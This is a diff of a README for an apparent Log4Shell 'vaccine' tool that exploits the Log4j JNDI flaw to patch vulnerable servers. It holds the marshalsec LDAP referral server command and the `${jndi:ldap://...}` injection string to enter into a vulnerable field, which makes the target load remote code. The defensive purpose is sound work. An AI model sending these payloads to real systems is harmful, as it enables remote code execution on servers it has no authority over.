@@ -60,6 +60,9 @@ loads the `JndiLookup` class. It then attempts to modify this jar by removing th
 modifying the plugin registry. There is inherently more risk in this approach as if the `log4j-core.jar` becomes
 corrupted, the JVM may crash on start.
 
+The choice of which mode to use is selected by the URL given in step (2.3)[execution] below. The
+class `Log4jRCETransient` selects the Transient Mode and the class `Log4jRCEPersistent` selects the persistent mode
+
 Persistent mode is based on the work of [TudbuT](https://github.com/TudbuT). Thank you!
 
 ## How to use
@@ -80,10 +83,9 @@ Persistent mode is based on the work of [TudbuT](https://github.com/TudbuT). Tha
 
    2.2 `mvn package -DskipTests`
 
-   2.3 For Transient mode use - `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCETransient"`
-   2.4 For Persistent mode use - `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCEPersistent"`
+   2.3 <a name="execution"></a>`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCE<Transient/Persistent>"`
 
-3. To immunize a server
+4. To immunize a server
 
    3.1 enter `${jndi:ldap://<IP_OF_LDAP_SERVER_FROM_STEP_2>:1389/a}` into a vulnerable field (such as user name)
 
